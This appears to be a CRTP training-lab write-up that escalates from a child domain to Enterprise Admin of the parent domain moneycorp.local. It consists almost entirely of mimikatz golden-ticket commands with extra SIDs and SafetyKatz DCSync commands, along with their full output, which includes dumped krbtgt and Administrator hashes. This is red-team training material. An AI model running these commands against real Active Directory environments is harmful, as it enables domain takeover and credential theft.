# CRTP: Hands-On 19

```
• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
```

## Escalate to EA using Krbtgt

```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-335606122-960912869-3279953914-519 ;
ServiceKey: 4e9815869d2090ccfca61c1fe0d23986 - rc4_hmac_nt
Lifetime  : 5/2/2023 12:25:24 PM ; 4/29/2033 12:25:24 PM ; 4/29/2033 12:25:24 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

DCsync attack using TGT ticket for krbtgt:

```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c7a5135513110d108390ee6c322423f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
      des_cbc_md5       (4096) : c20dc80d51f7abd9

* Primary:Kerberos *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : c20dc80d51f7abd9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  49fec950691bbeba1b0d33d5a48d0293
    02  0b0c4dbc527ee3154877e070d043cd0d
    03  987346e7f810d2b616da385b0c2549ec
    04  49fec950691bbeba1b0d33d5a48d0293
    05  0b0c4dbc527ee3154877e070d043cd0d
    06  333eda93ecfba8d60c57be7f59b14c62
    07  49fec950691bbeba1b0d33d5a48d0293
    08  cdf2b153a374773dc94ee74d14610428
    09  cdf2b153a374773dc94ee74d14610428
    10  a6687f8a2a0a6dfd7c054d63c0568e61
    11  3cf736e35d2a54f1b0c3345005d3f962
    12  cdf2b153a374773dc94ee74d14610428
    13  50f935f7e1b88f89fba60ed23c8d115c
    14  3cf736e35d2a54f1b0c3345005d3f962
    15  06c616b2109569ddd69c8fc00c6a413c
    16  06c616b2109569ddd69c8fc00c6a413c
    17  179b9c2fd5a34cbb6013df534bf05726
    18  5f217f838649436f34bbf13ccb127f44
    19  3564c9de46ad690b83268cde43c21854
    20  1caa9da91c85a1e176fb85cdefc57587
    21  27b7de3c5a16e7629659152656022831
    22  27b7de3c5a16e7629659152656022831
    23  65f5f95db76e43bd6c4ad216b7577604
    24  026c59a45699b631621233cb38733174
    25  026c59a45699b631621233cb38733174
    26  342a52ec1d3b39d90af55460bcda72e8
    27  ef1e1a688748f79d16e8e32318f51465
    28  9e93ee8e0bcccb1451face3dba22cc69
    29  480da975c1dfc76717a63edc6bb29d7b


mimikatz(commandline) # exit
Bye!

C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 11/11/2022 7:33:23 AM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 71d04f9d50ceb1f64de7a09f23e6dc4c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fd1efebb8f6a43ec25bc21dd68e762bf

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-R6HGNL110DLAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a85958da138b6b0cea2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0
      aes128_hmac       (4096) : 294d631dda15cc844b48a18a51f0e85e
      des_cbc_md5       (4096) : ba4a1abc01d3ec9d
    OldCredentials
      aes256_hmac       (4096) : 944f2ae7f0ecfeac6b494c44ef4b02fa6bbad1c65849f4aea40ed33cd7242f84
      aes128_hmac       (4096) : 57493a76eaf1bdcec3f310305773fbc3
      des_cbc_md5       (4096) : 9b7586022fab5431
    OlderCredentials
      aes256_hmac       (4096) : 3ee5808422b219225ab963c722f79f409835cd6a9a88408dd8fccb600b62508e
      aes128_hmac       (4096) : 5eed578bc4fe22ecb57f2a5c96f66bc2
      des_cbc_md5       (4096) : cb57857c52676ba1

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-R6HGNL110DLAdministrator
    Credentials
      des_cbc_md5       : ba4a1abc01d3ec9d
    OldCredentials
      des_cbc_md5       : 9b7586022fab5431


mimikatz(commandline) # exit
Bye!
```


